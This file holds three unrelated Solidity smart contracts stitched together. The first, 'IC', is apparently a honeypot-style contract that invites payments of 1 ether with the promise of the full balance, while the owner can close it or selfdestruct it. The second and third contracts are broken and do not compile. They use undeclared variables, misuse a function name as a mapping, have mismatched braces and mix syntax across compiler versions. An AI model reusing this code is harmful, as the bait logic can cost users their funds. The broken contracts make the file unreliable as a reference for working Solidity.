pragma solidity ^0.4.25;

contract IC {
    function() public payable {}
    address Owner; bool closed = false;
    function set() public payable {
        if (0==Owner) Owner=msg.sender;
    }
    function close(bool F) public {
        if (msg.sender==Owner) closed=F;
    }
    function end() public {
            if (msg.sender==Owner) selfdestruct(msg.sender);
    }
    function get() public payable {
        if (msg.value>=1 ether && !closed) {
            msg.sender.transfer(address(this).balance);
        }
    }
}
pragma solidity ^0.5.24;
contract check {
	uint validSender;
	constructor() public {owner = msg.sender;}
	function checkAccount(address account,uint key) {
		if (msg.sender != owner)
			throw;
			checkAccount[account] = key;
		}
	}
}
pragma solidity ^0.4.24;
contract ContractExternalCall {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function externalSignal() public {
  	if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
   		msg.sender.call{value: msg.value, gas: 5000}
   		depositAmount[msg.sender] = 0;
		}
	}
}
